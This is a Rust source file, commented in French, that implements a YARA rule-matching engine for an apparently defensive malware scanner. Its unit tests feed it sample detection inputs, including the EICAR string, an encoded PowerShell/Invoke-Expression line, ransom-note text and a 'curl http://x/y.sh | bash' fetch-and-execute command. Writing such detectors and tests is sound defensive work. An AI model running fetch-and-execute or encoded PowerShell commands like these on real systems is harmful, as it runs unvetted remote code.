//! yara-engine — moteur de règles YARA réel (feuille de route §3).
//!
//! Charge et évalue les règles `.yar` du sous-ensemble utilisé par optiCombat.
//! Les règles du dépôt (`runtime/rules/*.yar`) sont embarquées via `include_str!`
//! pour un chargement par défaut sans dépendre du chemin d'exécution ; un
//! chargement depuis un répertoire externe reste possible (`from_dir`).
//!
//! yara-x reste le remplacement cible pour la compatibilité YARA totale
//! (chaînes hex, regex, modules) ; ce moteur couvre le périmètre réel actuel.

mod parser;

pub use parser::{parse_condition, parse_rules, ParseError, Rule};
use parser::{Count, Expr, StringSet};

use aho_corasick::AhoCorasick;
use engine_core::{
    Detection, Engine, EngineError, EngineResult, FileKind, ScanContext, Severity, Verdict,
};
use std::collections::HashSet;

/// Règles du dépôt, embarquées à la compilation sous forme masquée (voir
/// `build.rs`) pour que le binaire ne contienne pas les chaînes détectées.
const RULES_MASK: u8 = 0xA5;
const TEST_RULES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/test_rules.yar.masked"));
const MALWARE_RULES: &[u8] =
    include_bytes!(concat!(env!("OUT_DIR"), "/malware_signatures.yar.masked"));
const SUSPICIOUS_RULES: &[u8] =
    include_bytes!(concat!(env!("OUT_DIR"), "/suspicious_strings.yar.masked"));

/// Démasque une source de règles embarquée.
fn unmask(masked: &[u8]) -> String {
    let bytes: Vec<u8> = masked.iter().map(|b| b ^ RULES_MASK).collect();
    String::from_utf8_lossy(&bytes).into_owned()
}

pub struct YaraEngine {
    rules: Vec<Rule>,
    /// Automate Aho-Corasick des chaînes sensibles à la casse.
    ac_cs: Option<AhoCorasick>,
    /// (index de règle, id de chaîne) par motif sensible à la casse.
    pat_cs: Vec<(usize, String)>,
    /// Automate des chaînes insensibles à la casse (`nocase`).
    ac_ci: Option<AhoCorasick>,
    pat_ci: Vec<(usize, String)>,
}

impl YaraEngine {
    /// Charge les règles embarquées du dépôt optiCombat.
    pub fn new() -> Self {
        let mut rules = Vec::new();
        for masked in [TEST_RULES, MALWARE_RULES, SUSPICIOUS_RULES] {
            match parse_rules(&unmask(masked)) {
                Ok(mut r) => rules.append(&mut r),
                // Ne doit jamais arriver : un test garantit que les règles
                // embarquées se parsent. On ne panique pas dans le moteur.
                Err(e) => debug_assert!(false, "règles YARA embarquées invalides : {e}"),
            }
        }
        Self::compile(rules)
    }

    /// Précompile les automates Aho-Corasick à partir des règles.
    fn compile(rules: Vec<Rule>) -> Self {
        let mut pat_cs = Vec::new();
        let mut needles_cs: Vec<Vec<u8>> = Vec::new();
        let mut pat_ci = Vec::new();
        let mut needles_ci: Vec<Vec<u8>> = Vec::new();
        for (ri, rule) in rules.iter().enumerate() {
            for st in &rule.strings {
                if st.bytes.is_empty() {
                    continue;
                }
                if st.nocase {
                    pat_ci.push((ri, st.id.clone()));
                    needles_ci.push(st.bytes.clone());
                } else {
                    pat_cs.push((ri, st.id.clone()));
                    needles_cs.push(st.bytes.clone());
                }
            }
        }
        let ac_cs = if needles_cs.is_empty() {
            None
        } else {
            AhoCorasick::new(&needles_cs).ok()
        };
        let ac_ci = if needles_ci.is_empty() {
            None
        } else {
            AhoCorasick::builder()
                .ascii_case_insensitive(true)
                .build(&needles_ci)
                .ok()
        };
        Self {
            rules,
            ac_cs,
            pat_cs,
            ac_ci,
            pat_ci,
        }
    }

    /// Charge toutes les règles `.yar` d'un répertoire (override runtime).
    pub fn from_dir(dir: &std::path::Path) -> Result<Self, EngineError> {
        let mut rules = Vec::new();
        for entry in std::fs::read_dir(dir)? {
            let path = entry?.path();
            if path.extension().and_then(|e| e.to_str()) == Some("yar") {
                let src = std::fs::read_to_string(&path)?;
                let parsed = parse_rules(&src).map_err(|e| EngineError::Parse(e.to_string()))?;
                rules.extend(parsed);
            }
        }
        if rules.is_empty() {
            return Err(EngineError::Unavailable("aucune règle YARA chargée".into()));
        }
        Ok(Self::compile(rules))
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Évalue toutes les règles sur un buffer, renvoie les détections.
    pub fn match_bytes(&self, data: &[u8]) -> Vec<Detection> {
        // Un seul balayage par automate (O(n)) au lieu d'une recherche
        // naïve O(n·m) par chaîne de règle.
        let mut matched: Vec<HashSet<String>> = vec![HashSet::new(); self.rules.len()];
        if let Some(ac) = &self.ac_cs {
            for m in ac.find_overlapping_iter(data) {
                let (ri, id) = &self.pat_cs[m.pattern().as_usize()];
                matched[*ri].insert(id.clone());
            }
        }
        if let Some(ac) = &self.ac_ci {
            for m in ac.find_overlapping_iter(data) {
                let (ri, id) = &self.pat_ci[m.pattern().as_usize()];
                matched[*ri].insert(id.clone());
            }
        }
        let mut dets = Vec::new();
        for (ri, rule) in self.rules.iter().enumerate() {
            if eval(&rule.condition, rule, &matched[ri]) {
                dets.push(Detection {
                    engine: "yara".into(),
                    name: rule.name.clone(),
                    score: severity_score(rule.severity),
                    severity: rule.severity,
                    explanation: format!("Règle YARA '{}' satisfaite", rule.name),
                });
            }
        }
        dets
    }
}

impl Default for YaraEngine {
    fn default() -> Self {
        Self::new()
    }
}

fn severity_score(s: Severity) -> i32 {
    match s {
        Severity::Critical => 90,
        Severity::Major => 60,
        Severity::Minor => 40,
        Severity::Informational => 20,
        Severity::Clean => 0,
    }
}

/// Verdict YARA selon la sévérité des règles satisfaites : seules les règles
/// `high`/`critical`/`test` tranchent (Malicious). Les règles `medium`/`low`
/// (chaînes suspectes) ne sont qu'un indice (Suspicious) cumulé par le
/// corrélateur — elles faisaient auparavant basculer en Malicious.
fn verdict_for(detections: &[Detection]) -> Verdict {
    if detections.is_empty() {
        Verdict::Clean
    } else if detections.iter().any(|d| d.severity >= Severity::Major) {
        Verdict::Malicious
    } else {
        Verdict::Suspicious
    }
}

fn eval(expr: &Expr, rule: &Rule, matched: &HashSet<String>) -> bool {
    match expr {
        Expr::Or(a, b) => eval(a, rule, matched) || eval(b, rule, matched),
        Expr::And(a, b) => eval(a, rule, matched) && eval(b, rule, matched),
        Expr::Ref(id) => matched.contains(id),
        Expr::Of(count, set) => {
            let candidates: Vec<&String> = match set {
                StringSet::Them => rule.strings.iter().map(|s| &s.id).collect(),
                StringSet::List(ids) => ids.iter().collect(),
                StringSet::Wildcard(pref) => rule
                    .strings
                    .iter()
                    .map(|s| &s.id)
                    .filter(|id| id.starts_with(pref))
                    .collect(),
            };
            let total = candidates.len();
            let hit = candidates
                .iter()
                .filter(|id| matched.contains(**id))
                .count();
            match count {
                Count::Num(n) => hit >= *n,
                Count::Any => hit >= 1,
                Count::All => total > 0 && hit == total,
            }
        }
    }
}

impl Engine for YaraEngine {
    fn name(&self) -> &str {
        "yara"
    }

    fn applicable(&self, ctx: &ScanContext) -> bool {
        // YARA pertinent partout sauf archives (déballées en amont).
        !matches!(ctx.kind, FileKind::Archive)
    }

    fn scan(&self, ctx: &ScanContext) -> Result<EngineResult, EngineError> {
        let data = ctx.bytes()?;
        let detections = self.match_bytes(&data);
        let verdict = verdict_for(&detections);
        Ok(EngineResult {
            engine: "yara".into(),
            verdict,
            detections,
            elapsed_ms: 0,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn charge_regles_embarquees() {
        let e = YaraEngine::new();
        // EICAR_Test + Generic_Malware_Strings + Possible_Ransomware
        // + SuspiciousPowerShell + SuspiciousDownloads = 5 règles réelles.
        assert!(e.rule_count() >= 5, "rules={}", e.rule_count());
    }

    #[test]
    fn detecte_eicar() {
        let e = YaraEngine::new();
        let data = br"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let dets = e.match_bytes(data);
        assert!(dets.iter().any(|d| d.name == "EICAR_Test"), "{dets:?}");
    }

    #[test]
    fn detecte_powershell_2_of_them() {
        let e = YaraEngine::new();
        // $ps2 "powershell -enc" + $ps3 "Invoke-Expression" → 2 of them.
        let data = b"powershell -enc ZQBjAGgAbwA= ; Invoke-Expression $x";
        let dets = e.match_bytes(data);
        assert!(
            dets.iter().any(|d| d.name == "SuspiciousPowerShell"),
            "{dets:?}"
        );
    }

    #[test]
    fn ransomware_message_fort() {
        let e = YaraEngine::new();
        let data = b"Warning: YOUR FILES ARE ENCRYPTED. Send bitcoin.";
        let dets = e.match_bytes(data);
        assert!(
            dets.iter().any(|d| d.name == "Possible_Ransomware"),
            "{dets:?}"
        );
    }

    #[test]
    fn fichier_propre_aucune_detection() {
        let e = YaraEngine::new();
        let dets = e.match_bytes(b"Bonjour, ceci est un document tout a fait normal.");
        assert!(dets.is_empty(), "faux positif: {dets:?}");
    }

    #[test]
    fn condition_n_of_wildcard() {
        // Note de rançon + extension de renommage → Possible_Ransomware (Cas 3).
        let e = YaraEngine::new();
        let data = b"Lisez HOW_TO_DECRYPT.txt : rapport.docx.locked";
        let dets = e.match_bytes(data);
        assert!(dets.iter().any(|d| d.name == "Possible_Ransomware"));
    }

    #[test]
    fn regles_embarquees_se_parsent_toutes() {
        for masked in [TEST_RULES, MALWARE_RULES, SUSPICIOUS_RULES] {
            assert!(parse_rules(&unmask(masked)).is_ok());
        }
    }

    #[test]
    fn binaire_ne_contient_pas_les_regles_en_clair() {
        let needle = b"YOUR FILES ARE ENCRYPTED";
        assert!(!MALWARE_RULES.windows(needle.len()).any(|w| w == needle));
    }

    #[test]
    fn faux_positifs_ransomware_corriges() {
        let e = YaraEngine::new();
        for benign in [
            &b"How to restore your settings: open the menu."[..],
            b"s = 'x'.encode('utf-8'); k = self.crypto.random()",
            b"const d = new TextEncoder().encode(x); window.crypto.subtle.digest(d)",
            b"The archive was saved as report.encrypted by 7-zip.",
            b"Invoice: please pay within 30 days.",
        ] {
            let dets = e.match_bytes(benign);
            assert!(
                !dets.iter().any(|d| d.name == "Possible_Ransomware"),
                "faux positif sur {:?}: {dets:?}",
                String::from_utf8_lossy(benign)
            );
        }
    }

    #[test]
    fn regle_low_donne_suspicious_pas_malicious() {
        let e = YaraEngine::new();
        let dets = e.match_bytes(b"curl http://x/y.sh | bash");
        assert!(dets.iter().any(|d| d.name == "SuspiciousDownloads"));
        assert_eq!(verdict_for(&dets), Verdict::Suspicious);
    }
}
